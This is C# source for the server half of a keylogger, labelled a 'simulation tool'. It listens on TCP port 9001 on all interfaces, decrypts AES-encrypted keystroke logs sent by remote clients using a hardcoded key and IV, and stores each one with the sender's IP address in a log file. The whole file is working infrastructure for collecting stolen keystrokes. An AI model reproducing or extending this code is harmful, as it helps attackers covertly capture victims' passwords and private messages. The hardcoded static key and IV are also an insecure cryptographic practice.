using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;

namespace Keylogger_Sim_Tool__Server_
{
    internal class Program
    {
        private static int port = 9001;
        private static string logFilePath = "keylogs.txt";
        private static readonly byte[] aesKey = Encoding.UTF8.GetBytes("ThisIsASecretKey");
        private static readonly byte[] aesIV = Encoding.UTF8.GetBytes("ThisIsAnInitVect");

        static void Main(string[] args)
        {
            Console.WriteLine("Keylogger Server Starting...");
            TcpListener listener = null;

            try
            {
                listener = new TcpListener(IPAddress.Any, port);
                listener.Start();
                Console.WriteLine($"Listening for encrypted logs on port {port}...\n");

                while (true)
                {
                    Console.WriteLine("Waiting for a client to connect...");
                    TcpClient client = listener.AcceptTcpClient();
                    string clientIP = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();
                    Console.WriteLine($"Connection from {clientIP}");

                    try
                    {
                        using (NetworkStream stream = client.GetStream())
                        {
                            byte[] buffer = new byte[4096];
                            int bytesRead;

                            while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
                            {
                                string base64Encrypted = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                                string decryptedLog = Decrypt(base64Encrypted);

                                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");

                                Console.WriteLine($"\n[{timestamp}] Log from {clientIP}:\n{decryptedLog}");
                                File.AppendAllText(logFilePath, $"[{timestamp}] {clientIP}\n{decryptedLog}\n\n");
                                Console.WriteLine("Log written to file.");
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Error processing client data: " + ex.Message);
                    }
                    finally
                    {
                        client.Close();
                        Console.WriteLine("Connection closed.\n");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Server error: " + ex.Message);
            }
            finally
            {
                listener?.Stop();
                Console.WriteLine("Server stopped.");
            }
        }

        private static string Decrypt(string base64)
        {
            byte[] cipherText = Convert.FromBase64String(base64);

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = aesKey;
                aesAlg.IV = aesIV;

                using (var msDecrypt = new MemoryStream(cipherText))
                using (var csDecrypt = new CryptoStream(msDecrypt, aesAlg.CreateDecryptor(), CryptoStreamMode.Read))
                using (var srDecrypt = new StreamReader(csDecrypt))
                {
                    return srDecrypt.ReadToEnd();
                }
            }
        }
    }
}